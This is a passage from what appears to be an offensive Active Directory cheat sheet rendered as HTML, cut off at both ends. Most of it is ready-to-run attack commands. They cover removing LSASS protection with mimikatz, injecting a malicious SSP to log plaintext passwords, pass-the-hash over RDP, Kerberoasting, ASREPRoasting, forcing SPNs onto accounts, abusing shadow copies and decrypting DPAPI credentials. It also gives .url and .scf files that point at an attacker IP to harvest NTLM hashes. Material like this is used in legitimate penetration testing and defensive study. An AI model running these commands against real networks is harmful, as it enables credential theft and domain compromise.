<a href="#__codelineno-25-3" id="__codelineno-25-3" name="__codelineno-25-3"></a>
<a href="#__codelineno-25-4" id="__codelineno-25-4" name="__codelineno-25-4"></a><span class="c">#Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe</span>
<a href="#__codelineno-25-5" id="__codelineno-25-5" name="__codelineno-25-5"></a><span class="c">#Now lets import the mimidriver.sys to the system</span>
<a href="#__codelineno-25-6" id="__codelineno-25-6" name="__codelineno-25-6"></a><span class="n">mimikatz</span> <span class="c"># !+</span>
<a href="#__codelineno-25-7" id="__codelineno-25-7" name="__codelineno-25-7"></a>
<a href="#__codelineno-25-8" id="__codelineno-25-8" name="__codelineno-25-8"></a><span class="c">#Now lets remove the protection flags from lsass.exe process</span>
<a href="#__codelineno-25-9" id="__codelineno-25-9" name="__codelineno-25-9"></a><span class="n">mimikatz</span> <span class="c"># !processprotect /process:lsass.exe /remove</span>
<a href="#__codelineno-25-10" id="__codelineno-25-10" name="__codelineno-25-10"></a>
<a href="#__codelineno-25-11" id="__codelineno-25-11" name="__codelineno-25-11"></a><span class="c">#Finally run the logonpasswords function to dump lsass</span>
<a href="#__codelineno-25-12" id="__codelineno-25-12" name="__codelineno-25-12"></a><span class="n">mimikatz</span> <span class="c"># sekurlsa::logonpasswords</span>
</code></pre></div> <ul> <li> <p>LSA as a Protected Process (Userland "Fileless" Bypass)</p> </li> <li> <p><a href="https://github.com/itm4n/PPLdump">PPLdump</a></p> </li> <li> <p><a href="https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland">Bypassing LSA Protection in Userland</a></p> </li> <li> <p>LSA is running as virtualized process (LSAISO) by Credential Guard</p> </li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-26-1" id="__codelineno-26-1" name="__codelineno-26-1"></a><span class="c">#Check if a process called lsaiso.exe exists on the running processes</span>
<a href="#__codelineno-26-2" id="__codelineno-26-2" name="__codelineno-26-2"></a><span class="n">tasklist</span> <span class="p">|</span><span class="n">findstr</span> <span class="n">lsaiso</span>
<a href="#__codelineno-26-3" id="__codelineno-26-3" name="__codelineno-26-3"></a>
<a href="#__codelineno-26-4" id="__codelineno-26-4" name="__codelineno-26-4"></a><span class="c">#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.</span>
<a href="#__codelineno-26-5" id="__codelineno-26-5" name="__codelineno-26-5"></a><span class="c">#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides</span>
<a href="#__codelineno-26-6" id="__codelineno-26-6" name="__codelineno-26-6"></a><span class="n">mimikatz</span> <span class="c"># misc::memssp</span>
<a href="#__codelineno-26-7" id="__codelineno-26-7" name="__codelineno-26-7"></a>
<a href="#__codelineno-26-8" id="__codelineno-26-8" name="__codelineno-26-8"></a><span class="c">#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</span>
</code></pre></div> <ul> <li><a href="https://adsecurity.org/?page_id=1821">Detailed Mimikatz Guide</a></li> <li><a href="https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a">Poking Around With 2 lsass Protection Options</a></li> </ul> <h3 id="remote-desktop-protocol">Remote Desktop Protocol<a class="headerlink" href="#remote-desktop-protocol" title="Permanent link"></a></h3> <p>If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.</p> <ul> <li>Mimikatz:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-27-1" id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="c">#We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag</span>
<a href="#__codelineno-27-2" id="__codelineno-27-2" name="__codelineno-27-2"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
<a href="#__codelineno-27-3" id="__codelineno-27-3" name="__codelineno-27-3"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">pth</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">Username</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">ntlm</span><span class="p">:&lt;</span><span class="n">NTLMHash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">run</span><span class="p">:</span><span class="s2">"mstsc.exe /restrictedadmin"</span>
<a href="#__codelineno-27-4" id="__codelineno-27-4" name="__codelineno-27-4"></a>
<a href="#__codelineno-27-5" id="__codelineno-27-5" name="__codelineno-27-5"></a><span class="c">#Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated</span>
</code></pre></div> <ul> <li>xFreeRDP:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-28-1" id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="n">xfreerdp</span>  <span class="p">+</span><span class="n">compression</span> <span class="p">+</span><span class="n">clipboard</span> <span class="p">/</span><span class="n">dynamic-resolution</span> <span class="p">+</span><span class="n">toggle-fullscreen</span> <span class="p">/</span><span class="n">cert-ignore</span> <span class="p">/</span><span class="n">bpp</span><span class="p">:</span><span class="n">8</span>  <span class="p">/</span><span class="n">u</span><span class="p">:&lt;</span><span class="n">Username</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">pth</span><span class="p">:&lt;</span><span class="n">NTLMHash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">v</span><span class="p">:&lt;</span><span class="n">Hostname</span> <span class="p">|</span> <span class="n">IPAddress</span><span class="p">&gt;</span>
</code></pre></div> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/2757.svg" title=":exclamation:"/> If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".</p> <h3 id="url-file-attacks">URL File Attacks<a class="headerlink" href="#url-file-attacks" title="Permanent link"></a></h3> <ul> <li>.url file</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-29-1" id="__codelineno-29-1" name="__codelineno-29-1"></a>[InternetShortcut]
<a href="#__codelineno-29-2" id="__codelineno-29-2" name="__codelineno-29-2"></a>URL=whatever
<a href="#__codelineno-29-3" id="__codelineno-29-3" name="__codelineno-29-3"></a>WorkingDirectory=whatever
<a href="#__codelineno-29-4" id="__codelineno-29-4" name="__codelineno-29-4"></a>IconFile=\\&lt;AttackersIp&gt;\%USERNAME%.icon
<a href="#__codelineno-29-5" id="__codelineno-29-5" name="__codelineno-29-5"></a>IconIndex=1
</code></pre></div> <div class="highlight"><pre><span></span><code><a href="#__codelineno-30-1" id="__codelineno-30-1" name="__codelineno-30-1"></a>[InternetShortcut]
<a href="#__codelineno-30-2" id="__codelineno-30-2" name="__codelineno-30-2"></a>URL=file://&lt;AttackersIp&gt;/leak/leak.html
</code></pre></div> <ul> <li>.scf file</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-31-1" id="__codelineno-31-1" name="__codelineno-31-1"></a>[Shell]
<a href="#__codelineno-31-2" id="__codelineno-31-2" name="__codelineno-31-2"></a>Command=2
<a href="#__codelineno-31-3" id="__codelineno-31-3" name="__codelineno-31-3"></a>IconFile=\\&lt;AttackersIp&gt;\Share\test.ico
<a href="#__codelineno-31-4" id="__codelineno-31-4" name="__codelineno-31-4"></a>[Taskbar]
<a href="#__codelineno-31-5" id="__codelineno-31-5" name="__codelineno-31-5"></a>Command=ToggleDesktop
</code></pre></div> <p>Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. <strong>Note</strong> that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.</p> <p><img alt="" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/2757.svg" title=":exclamation:"/> .scf file attacks won't work on the latest versions of Windows.</p> <h3 id="useful-tools">Useful Tools<a class="headerlink" href="#useful-tools" title="Permanent link"></a></h3> <ul> <li><a href="https://github.com/besimorhino/powercat">Powercat</a> netcat written in powershell, and provides tunneling, relay and portforward capabilities.</li> <li><a href="https://github.com/Mr-Un1k0d3r/SCShell">SCShell</a> fileless lateral movement tool that relies on ChangeServiceConfigA to run command</li> <li><a href="https://github.com/Hackplayers/evil-winrm">Evil-Winrm</a> the ultimate WinRM shell for hacking/pentesting</li> <li><a href="https://github.com/antonioCoco/RunasCs">RunasCs</a> Csharp and open version of windows builtin runas.exe</li> <li><a href="https://github.com/Greenwolf/ntlm_theft.git">ntlm_theft</a> creates all possible file formats for url file attacks</li> </ul> <h2 id="domain-privilege-escalation">Domain Privilege Escalation<a class="headerlink" href="#domain-privilege-escalation" title="Permanent link"></a></h2> <h3 id="kerberoast">Kerberoast<a class="headerlink" href="#kerberoast" title="Permanent link"></a></h3> <p><em>What's that?</em> All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"<br/> account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.</p> <ul> <li>PowerView:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-32-1" id="__codelineno-32-1" name="__codelineno-32-1"></a><span class="c">#Get User Accounts that are used as Service Accounts</span>
<a href="#__codelineno-32-2" id="__codelineno-32-2" name="__codelineno-32-2"></a><span class="nb">Get-NetUser</span> <span class="n">-SPN</span>
<a href="#__codelineno-32-3" id="__codelineno-32-3" name="__codelineno-32-3"></a>
<a href="#__codelineno-32-4" id="__codelineno-32-4" name="__codelineno-32-4"></a><span class="c">#Get every available SPN account, request a TGS and dump its hash</span>
<a href="#__codelineno-32-5" id="__codelineno-32-5" name="__codelineno-32-5"></a><span class="nb">Invoke-Kerberoast</span>
<a href="#__codelineno-32-6" id="__codelineno-32-6" name="__codelineno-32-6"></a>
<a href="#__codelineno-32-7" id="__codelineno-32-7" name="__codelineno-32-7"></a><span class="c">#Requesting the TGS for a single account:</span>
<a href="#__codelineno-32-8" id="__codelineno-32-8" name="__codelineno-32-8"></a><span class="nb">Request-SPNTicket</span>
<a href="#__codelineno-32-9" id="__codelineno-32-9" name="__codelineno-32-9"></a>
<a href="#__codelineno-32-10" id="__codelineno-32-10" name="__codelineno-32-10"></a><span class="c">#Export all tickets using Mimikatz</span>
<a href="#__codelineno-32-11" id="__codelineno-32-11" name="__codelineno-32-11"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">'"kerberos::list /export"'</span>
</code></pre></div> <ul> <li>AD Module:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-33-1" id="__codelineno-33-1" name="__codelineno-33-1"></a><span class="c">#Get User Accounts that are used as Service Accounts</span>
<a href="#__codelineno-33-2" id="__codelineno-33-2" name="__codelineno-33-2"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">"$null"</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
</code></pre></div> <ul> <li>Impacket:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-34-1" id="__codelineno-34-1" name="__codelineno-34-1"></a><span class="n">python</span> <span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">DomainName</span><span class="p">&gt;/&lt;</span><span class="n">DomainUser</span><span class="p">&gt;:&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="n">-outputfile</span> <span class="p">&lt;</span><span class="n">FileName</span><span class="p">&gt;</span>
</code></pre></div> <ul> <li>Rubeus:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-35-1" id="__codelineno-35-1" name="__codelineno-35-1"></a><span class="c">#Kerberoasting and outputing on a file with a spesific format</span>
<a href="#__codelineno-35-2" id="__codelineno-35-2" name="__codelineno-35-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">fileName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span>
<a href="#__codelineno-35-3" id="__codelineno-35-3" name="__codelineno-35-3"></a>
<a href="#__codelineno-35-4" id="__codelineno-35-4" name="__codelineno-35-4"></a><span class="c">#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts</span>
<a href="#__codelineno-35-5" id="__codelineno-35-5" name="__codelineno-35-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">fileName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">rc4opsec</span>
<a href="#__codelineno-35-6" id="__codelineno-35-6" name="__codelineno-35-6"></a>
<a href="#__codelineno-35-7" id="__codelineno-35-7" name="__codelineno-35-7"></a><span class="c">#Kerberoast AES enabled accounts</span>
<a href="#__codelineno-35-8" id="__codelineno-35-8" name="__codelineno-35-8"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">fileName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">aes</span>
<a href="#__codelineno-35-9" id="__codelineno-35-9" name="__codelineno-35-9"></a>
<a href="#__codelineno-35-10" id="__codelineno-35-10" name="__codelineno-35-10"></a><span class="c">#Kerberoast spesific user account</span>
<a href="#__codelineno-35-11" id="__codelineno-35-11" name="__codelineno-35-11"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">fileName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">simple</span>
<a href="#__codelineno-35-12" id="__codelineno-35-12" name="__codelineno-35-12"></a>
<a href="#__codelineno-35-13" id="__codelineno-35-13" name="__codelineno-35-13"></a><span class="c">#Kerberoast by specifying the authentication credentials</span>
<a href="#__codelineno-35-14" id="__codelineno-35-14" name="__codelineno-35-14"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">fileName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">creduser</span><span class="p">:&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">credpassword</span><span class="p">:&lt;</span><span class="n">password</span><span class="p">&gt;</span>
</code></pre></div> <h3 id="asreproast">ASREPRoast<a class="headerlink" href="#asreproast" title="Permanent link"></a></h3> <p><em>What's that?</em> If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted<br/> blob and bruteforce it offline.</p> <ul> <li>PowerView: <code>Get-DomainUser -PreauthNotRequired -Verbose</code></li> <li>AD Module: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li> </ul> <p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more! Check for interesting permissions on accounts:</p> <p><strong>Hint:</strong> We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!</p> <p>PowerView:</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-36-1" id="__codelineno-36-1" name="__codelineno-36-1"></a><span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentinyReferenceName</span> <span class="o">-match</span> <span class="s2">"RDPUsers"</span><span class="p">}</span>
<a href="#__codelineno-36-2" id="__codelineno-36-2" name="__codelineno-36-2"></a><span class="n">Disable</span> <span class="n">Kerberos</span> <span class="n">Preauth</span><span class="p">:</span>
<a href="#__codelineno-36-3" id="__codelineno-36-3" name="__codelineno-36-3"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">UserAccount</span><span class="p">&gt;</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
<a href="#__codelineno-36-4" id="__codelineno-36-4" name="__codelineno-36-4"></a><span class="n">Check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">value</span> <span class="n">changed</span><span class="p">:</span>
<a href="#__codelineno-36-5" id="__codelineno-36-5" name="__codelineno-36-5"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="n">-Verbose</span>
</code></pre></div> <ul> <li>And finally execute the attack using the <a href="https://github.com/HarmJ0y/ASREPRoast">ASREPRoast</a> tool.</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-37-1" id="__codelineno-37-1" name="__codelineno-37-1"></a><span class="c">#Get a spesific Accounts hash:</span>
<a href="#__codelineno-37-2" id="__codelineno-37-2" name="__codelineno-37-2"></a><span class="nb">Get-ASREPHash</span> <span class="n">-UserName</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-Verbose</span>
<a href="#__codelineno-37-3" id="__codelineno-37-3" name="__codelineno-37-3"></a>
<a href="#__codelineno-37-4" id="__codelineno-37-4" name="__codelineno-37-4"></a><span class="c">#Get any ASREPRoastable Users hashes:</span>
<a href="#__codelineno-37-5" id="__codelineno-37-5" name="__codelineno-37-5"></a><span class="nb">Invoke-ASREPRoast</span> <span class="n">-Verbose</span>
</code></pre></div> <ul> <li>Using Rubeus:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-38-1" id="__codelineno-38-1" name="__codelineno-38-1"></a><span class="c">#Trying the attack for all domain users</span>
<a href="#__codelineno-38-2" id="__codelineno-38-2" name="__codelineno-38-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">format</span><span class="p">:&lt;</span><span class="n">hashcat</span><span class="p">|</span><span class="n">john</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">filename</span><span class="p">&gt;</span>
<a href="#__codelineno-38-3" id="__codelineno-38-3" name="__codelineno-38-3"></a>
<a href="#__codelineno-38-4" id="__codelineno-38-4" name="__codelineno-38-4"></a><span class="c">#ASREPRoast spesific user</span>
<a href="#__codelineno-38-5" id="__codelineno-38-5" name="__codelineno-38-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">user</span><span class="p">:&lt;</span><span class="n">username</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">format</span><span class="p">:&lt;</span><span class="n">hashcat</span><span class="p">|</span><span class="n">john</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">filename</span><span class="p">&gt;</span>
<a href="#__codelineno-38-6" id="__codelineno-38-6" name="__codelineno-38-6"></a>
<a href="#__codelineno-38-7" id="__codelineno-38-7" name="__codelineno-38-7"></a><span class="c">#ASREPRoast users of a spesific OU (Organization Unit)</span>
<a href="#__codelineno-38-8" id="__codelineno-38-8" name="__codelineno-38-8"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">ou</span><span class="p">:&lt;</span><span class="n">OUName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">format</span><span class="p">:&lt;</span><span class="n">hashcat</span><span class="p">|</span><span class="n">john</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">DomainName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:&lt;</span><span class="n">filename</span><span class="p">&gt;</span>
</code></pre></div> <ul> <li>Using Impacket:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-39-1" id="__codelineno-39-1" name="__codelineno-39-1"></a><span class="c">#Trying the attack for the specified users on the file</span>
<a href="#__codelineno-39-2" id="__codelineno-39-2" name="__codelineno-39-2"></a><span class="n">python</span> <span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">domain_name</span><span class="p">&gt;/</span> <span class="n">-usersfile</span> <span class="p">&lt;</span><span class="n">users_file</span><span class="p">&gt;</span> <span class="n">-outputfile</span> <span class="p">&lt;</span><span class="n">FileName</span><span class="p">&gt;</span>
</code></pre></div> <h3 id="password-spray-attack">Password Spray Attack<a class="headerlink" href="#password-spray-attack" title="Permanent link"></a></h3> <p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse on other domain accounts.</p> <p><strong>Tools:</strong></p> <ul> <li><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a></li> <li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li> <li><a href="https://github.com/wavestone-cdt/Invoke-CleverSpray">Invoke-CleverSpray</a></li> <li><a href="https://github.com/Greenwolf/Spray">Spray</a></li> </ul> <h3 id="force-set-spn">Force Set SPN<a class="headerlink" href="#force-set-spn" title="Permanent link"></a></h3> <p><em>What's that?</em> If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._</p> <ul> <li>PowerView:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-40-1" id="__codelineno-40-1" name="__codelineno-40-1"></a><span class="c">#Check for interesting permissions on accounts:</span>
<a href="#__codelineno-40-2" id="__codelineno-40-2" name="__codelineno-40-2"></a><span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentinyReferenceName</span> <span class="o">-match</span> <span class="s2">"RDPUsers"</span><span class="p">}</span>
<a href="#__codelineno-40-3" id="__codelineno-40-3" name="__codelineno-40-3"></a>
<a href="#__codelineno-40-4" id="__codelineno-40-4" name="__codelineno-40-4"></a><span class="c">#Check if current user has already an SPN setted:</span>
<a href="#__codelineno-40-5" id="__codelineno-40-5" name="__codelineno-40-5"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">serviceprincipalname</span>
<a href="#__codelineno-40-6" id="__codelineno-40-6" name="__codelineno-40-6"></a>
<a href="#__codelineno-40-7" id="__codelineno-40-7" name="__codelineno-40-7"></a><span class="c">#Force set the SPN on the account:</span>
<a href="#__codelineno-40-8" id="__codelineno-40-8" name="__codelineno-40-8"></a><span class="nb">Set-DomainObject</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-Set</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">'ops/whatever1'</span><span class="p">}</span>
</code></pre></div> <ul> <li>AD Module:</li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-41-1" id="__codelineno-41-1" name="__codelineno-41-1"></a><span class="c">#Check if current user has already an SPN setted</span>
<a href="#__codelineno-41-2" id="__codelineno-41-2" name="__codelineno-41-2"></a><span class="nb">Get-ADUser</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ServicePrincipalName</span>
<a href="#__codelineno-41-3" id="__codelineno-41-3" name="__codelineno-41-3"></a>
<a href="#__codelineno-41-4" id="__codelineno-41-4" name="__codelineno-41-4"></a><span class="c">#Force set the SPN on the account:</span>
<a href="#__codelineno-41-5" id="__codelineno-41-5" name="__codelineno-41-5"></a><span class="nb">Set-ADUser</span> <span class="n">-Identiny</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-ServicePrincipalNames</span> <span class="p">@{</span><span class="n">Add</span><span class="p">=</span><span class="s1">'ops/whatever1'</span><span class="p">}</span>
</code></pre></div> <p>Finally use any tool from before to grab the hash and kerberoast it!</p> <h3 id="abusing-shadow-copies">Abusing Shadow Copies<a class="headerlink" href="#abusing-shadow-copies" title="Permanent link"></a></h3> <p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.</p> <div class="highlight"><pre><span></span><code><a href="#__codelineno-42-1" id="__codelineno-42-1" name="__codelineno-42-1"></a><span class="c">#List shadow copies using vssadmin (Needs Admnistrator Access)</span>
<a href="#__codelineno-42-2" id="__codelineno-42-2" name="__codelineno-42-2"></a><span class="n">vssadmin</span> <span class="n">list</span> <span class="n">shadows</span>
<a href="#__codelineno-42-3" id="__codelineno-42-3" name="__codelineno-42-3"></a>
<a href="#__codelineno-42-4" id="__codelineno-42-4" name="__codelineno-42-4"></a><span class="c">#List shadow copies using diskshadow</span>
<a href="#__codelineno-42-5" id="__codelineno-42-5" name="__codelineno-42-5"></a><span class="n">diskshadow</span> <span class="n">list</span> <span class="n">shadows</span> <span class="n">all</span>
<a href="#__codelineno-42-6" id="__codelineno-42-6" name="__codelineno-42-6"></a>
<a href="#__codelineno-42-7" id="__codelineno-42-7" name="__codelineno-42-7"></a><span class="c">#Make a symlink to the shadow copy and access it</span>
<a href="#__codelineno-42-8" id="__codelineno-42-8" name="__codelineno-42-8"></a><span class="n">mklink</span> <span class="p">/</span><span class="n">d</span> <span class="n">c</span><span class="p">:\</span><span class="n">shadowcopy</span> <span class="p">\\?\</span><span class="n">GLOBALROOT</span><span class="p">\</span><span class="n">Device</span><span class="p">\</span><span class="n">HarddiskVolumeShadowCopy1</span><span class="p">\</span>
</code></pre></div> <ol> <li>You can dump the backuped SAM database and harvest credentials.</li> <li>Look for DPAPI stored creds and decrypt them.</li> <li>Access backuped sensitive files.</li> </ol> <h3 id="list-and-decrypt-stored-credentials-using-mimikatz">List and Decrypt Stored Credentials using Mimikatz<a class="headerlink" href="#list-and-decrypt-stored-credentials-using-mimikatz" title="Permanent link"></a></h3> <p>Usually encrypted credentials are stored in:</p> <ul> <li><code>%appdata%\Microsoft\Credentials</code></li> <li><code>%localappdata%\Microsoft\Credentials</code></li> </ul> <div class="highlight"><pre><span></span><code><a href="#__codelineno-43-1" id="__codelineno-43-1" name="__codelineno-43-1"></a><span class="c">#By using the cred function of mimikatz we can enumerate the cred object and get information about it:</span>
<a href="#__codelineno-43-2" id="__codelineno-43-2" name="__codelineno-43-2"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">cred</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">"%appdata%\Microsoft\Credentials\&lt;CredHash&gt;"</span>
<a href="#__codelineno-43-3" id="__codelineno-43-3" name="__codelineno-43-3"></a>
<a href="#__codelineno-43-4" id="__codelineno-43-4" name="__codelineno-43-4"></a><span class="c">#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential</span>
<a href="#__codelineno-43-5" id="__codelineno-43-5" name="__codelineno-43-5"></a><span class="c">#Lets enumerate the Master Key:</span>
<a href="#__codelineno-43-6" id="__codelineno-43-6" name="__codelineno-43-6"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">masterkey</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">"%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;"</span>
<a href="#__codelineno-43-7" id="__codelineno-43-7" name="__codelineno-43-7"></a>
<a href="#__codelineno-43-8" id="__codelineno-43-8" name="__codelineno-43-8"></a><span class="c">#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:</span>
<a href="#__codelineno-43-9" id="__codelineno-43-9" name="__codelineno-43-9"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">masterkey</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="s2">"%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;"</span> <span class="p">/</span><span class="n">rpc</span>
<a href="#__codelineno-43-10" id="__codelineno-43-10" name="__codelineno-43-10"></a>
<a href="#__codelineno-43-11" id="__codelineno-43-11" name="__codelineno-43-11"></a><span class="c">#We now have the masterkey in our local cache:</span>
<a href="#__codelineno-43-12" id="__codelineno-43-12" name="__codelineno-43-12"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">cache</span>
<a href="#__codelineno-43-13" id="__codelineno-43-13" name="__codelineno-43-13"></a>
<a href="#__codelineno-43-14" id="__codelineno-43-14" name="__codelineno-43-14"></a><span class="c">#Finally we can decrypt the credential using the cached masterkey:</span>
